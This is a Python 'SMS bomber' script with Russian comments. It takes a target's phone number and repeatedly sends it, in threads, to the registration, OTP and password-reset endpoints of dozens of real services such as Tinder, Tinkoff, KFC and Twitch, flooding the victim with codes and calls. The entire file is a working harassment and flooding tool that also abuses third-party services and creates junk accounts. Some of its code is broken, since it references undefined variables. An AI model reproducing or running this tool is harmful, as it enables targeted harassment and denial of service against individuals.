import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style
from threading import Thread

# На строке 273 нужно убрать "#" если вы из России, 
# посколько второй соавтор из Украины не все сервисы работают как должны в частности Mail.ru 


class Bomber(Thread):
    phone = ''
    total = 0

    def setnumber(phones):
        Bomber.phone = phones
        
        
    @staticmethod
    def setphones(self):
        
        phone = Bomber.phone

        if phone[0] == '+':
            phone = phone[1:]
        if phone[0] == '8':
            phone = '7'+ phone[1:]
        if phone[0] == '9':
            phone = '7'+ phone

        self.name = ''
        for _ in range(12):
            self.name = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.password = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
            self.username = self.name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

        self.phone9 = phone[1:]
        self.phoneAresBank = '+'+ phone[0]+'('+ phone[1:4]+')'+ phone[4:7]+'-'+ phone[7:9]+'-'+ phone[9:11]
        self.phone9dostavista =  self.phone9[:3]+'+'+ self.phone9[3:6]+'-'+ self.phone9[6:8]+'-'+ self.phone9[8:10]
        self.phoneOstin = '+'+ phone[0]+'+('+ phone[1:4]+')'+ phone[4:7]+'-'+ phone[7:9]+'-'+ phone[9:11]
        self.phonePizzahut = '+' + phone[0]+' ('+ phone[1:4]+') '+ phone[4:7]+' '+ phone[7:9]+' '+ phone[9:11]
        self.phoneGorzdrav =  phone[1:4]+') '+ phone[4:7]+'-'+ phone[7:9]+'-'+ phone[9:11]
        
    def __init__(self, match_iter = 1):
        Thread.__init__(self)
        if Bomber.total == 0:
            Bomber.setphones(self)
            Bomber.total += 1
        else:
            Bomber.total += 1
        self.match_iter = match_iter
        self.name_process = "bomber %s is running" % Bomber.total

    def run(self):
        iteration = 0
        phone = Bomber.phone
        while iteration < self.match_iter:
            _email = self.name+f'{iteration}'+'@gmail.com'
            email = self.name+f'{iteration}'+'@gmail.com'
            text = ""
            try:
                requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
                text += '[+] Grab отправлено!'
            except:
                text += '[-] Не отправлено (Grab)!'

            try:
                requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': self.phone9}).json()["res"]
                text += '[+] RuTaxi отправлено!'
            except:
                text += '[-] Не отправлено (RuTaxi)!'

            try:
                requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})
                text += '[+] BelkaCar отправлено!'
            except:
                text += '[-] Не отправлено! (BelkaCar)'

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
                text += '[+] Tinder отправлено!'
            except:
                print('[-] Не отправлено! (Tinder)')

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
                print('[+] Karusel отправлено!')
            except:
                print('[-] Не отправлено! (Karusel)')

            try:
                requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
                print('[+] Tinkoff отправлено!')
            except:
                print('[-] Не отправлено! (Tinkoff)')

            try:
                requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
                print('[+] MTS отправлено!')
            except:
                print('[-] Не отправлено!')

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                print('[+] Youla отправлено!')
            except:
                print('[-] Не отправлено! (Youla)')

            try:
                requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': self.phonePizzahut, '_token':'*'})
                print('[+] PizzaHut отправлено!')
            except:
                print('[-] Не отправлено! (PizzaHut)')

            try:
                requests.post('https://www.rabota.ru/remind', data={'credential': phone})
                print('[+] Rabota отправлено!')
            except:
                print('[-] Не отправлено! (Rabota)')

            try:
                requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+ phone})
                print('[+] Rutube отправлено!')
            except:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone +'/')
                print('[+] Citilink отправлено! (Citilink)')

            try:
                requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': self.name,'phone': phone, 'promo': 'yellowforma'})
                print('[+] Smsint отправлено!')
            except:
                print('[-] Не отправлено! (Smsint)')

            try:
                requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+self.phone9+'&country_code=%2B7&nod=4&locale=en')
                print('[+] oyorooms отправлено!')
            except:
                print('[-] Не отправлено! (oyorooms)')

            try:
                requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': phone,'g-recaptcha-response': '','recaptcha': 'on'})
                print('[+] MVideo отправлено!')
            except:
                print('[-] Не отправлено! (MVideo)')

            try:
                requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
                print('[+] newnext отправлено!')
            except:
                print('[-] Не отправлено! (newnext)')

            try:
                requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': phone})
                print('[+] Sunlight отправлено!')
            except:
                print('[-] Не отправлено! (Sunlight)')

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobilephone': phone, 'deliveryOption': 'sms'})
                print('[+] alpari отправлено!')
            except:
                print('[-] Не отправлено! (alpari))')

            try:
                requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': phone})
                print('[+] Invitro отправлено!')
            except:
                print('[-] Не отправлено! (Invitro)')

            try:
                requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':phone},'id':'1'})
                print('[+] Sberbank отправлено!')
            except:
                print('[-] Не отправлено! (Sberbank)')

            try:
                requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
                print('[+] Psbank отправлено!')
            except:
                print('[-] Не отправлено! (Psbank)')

            try:
                requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': phone})
                print('[+] Beltelcom отправлено!')
            except:
                print('[-] Не отправлено! (Beltelcom)')

            try:
                requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone})
                print('[+] Karusel отправлено!')
            except:
                print('[-] Не отправлено! (Karusel)')

            try:
                requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + phone})
                print('[+] KFC отправлено!')
            except:
                print('[-] Не отправлено! (KFC)')

            try:
                requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
                print('[+] carsmile отправлено!')
            except:
                print('[-] Не отправлено! (carmile)')

            try:
                requests.post('https://www.citilink.ru/registration/confirm/phone/+' + phone + '/')
                print('[+] Citilink отправлено!')
            except:
                print('[-] Не отправлено! (Citilink)')

            try:
                requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": phone, "SignupForm[device_type]": 3})
                print('[+] Delitime отправлено!')
            except:
                print('[-] Не отправлено! (Delitime)')

            try:
                requests.get('https://findclone.ru/register', params={'phone': '+' + phone})
                print('[+] findclone звонок отправлен!')
            except:
                print('[-] Не отправлено! (findclone)')

            try:
                requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": phone}})
                print('[+] Guru отправлено!')
            except:
                print('[-] Не отправлено! (Guru)')

            try:
                requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
                print('[+] ICQ отправлено!')
            except:
                print('[-] Не отправлено! (ICQ)')

            try:
                requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
                print('[+] InDriver отправлено!')
            except:
                print('[-] Не отправлено! (Indrive)')

            try:
                requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": self.password, "application": "lkp", "login": "+" + phone})
                print('[+] Invitro отправлено!')
            except:
                print('[-] Не отправлено! (Invitro)')

            try:
                requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": phone})
                print('[+] Pmsm отправлено!')
            except:
                print('[-] Не отправлено! (Pmsm)')

            try:
                requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": phone})
                print('[+] IVI отправлено!')
            except:
                print('[-] Не отправлено (IVI)')

            try:
                requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formattedphone})
                print('[+] Lenta отправлено!')
            except:
                print('[-] Не отправлено! (Lenta)')

            try:
                 #requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + phone, "api": 2, "email": "email","x-email": "x-email"})
                print('[+] Mail.ru не отправлено!')
            except:
                print('[-] Не отправлено! (Mail.ru)')

            try:
                requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": phone, "recaptcha": 'off', "g-recaptcha-response": ""})
                print('[+] MVideo отправлено!')
            except:
                print('[-] Не отправлено! (MVideo)')

            try:
                requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + phone})
                print('[+] OK отправлено!')
            except:
                print('[-] Не отправлено! (OK)')

            try:
                requests.post('https://plink.tech/register/',json={"phone": phone})
                print('[+] Plink отправлено!')
            except:
                print('[-] Не отправлено! (Plink)')

            try:
                requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": phone})
                print('[+] qlean отправлено!')
            except:
                print('[-] Не отправлено! (qlean)')

            try:
                requests.post("http://smsgorod.ru/sendsms.php",data={"number": phone})
                print('[+] SMSgorod отправлено!')
            except:
                print('[-] Не отправлено! (SMSgorod)')

            try:
                requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': phone})
                print('[+] Tinder отправлено!')
            except:
                print('[-] Не отправлено! (Tinder)')

            try:
                requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": self.password, "phone_number": phone,"username": self.username})
                print('[+] Twitch отправлено!')
            except:
                print('[-] Не отправлено! (Twitch)')

            try:
                requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': phone},headers={'App-ID': 'cabinet'})
                print('[+] CabWiFi отправлено!')
            except:
                print('[-] Не отправлено! (CabWifi)')

            try:
                requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": phone, "type": 2})
                print('[+] wowworks отправлено!')
            except:
                print('[-] Не отправлено! (wowworks)')

            try:
                requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + phone})
                print('[+] Eda.Yandex отправлено!')
            except:
                print('[-] Не отправлено! (Eda.Yandex)')

            try:
                requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
                print('[+] Youla отправлено!')
            except:
                print('[-] Не отправлено! (Youla)')

            try:
                requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobilephone": phone, "deliveryOption": "sms"})
                print('[+] Alpari отправлено!')
            except:
                print('[-] Не отправлено! (Alpari)')

            try:
                requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone})
                print('[+] SMS отправлено!')
            except:
                print('[-] не отправлено! (SMS)')

            try:
                requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": phone})
                print('[+] Delivery отправлено!')
            except:
                print('[-] Не отправлено! (Delivery)')

            try:
                iteration += 1
                print(('{} круг пройден.').format(iteration))
            except:
                break
        else: print("process {} is finished".format(self.name_process))
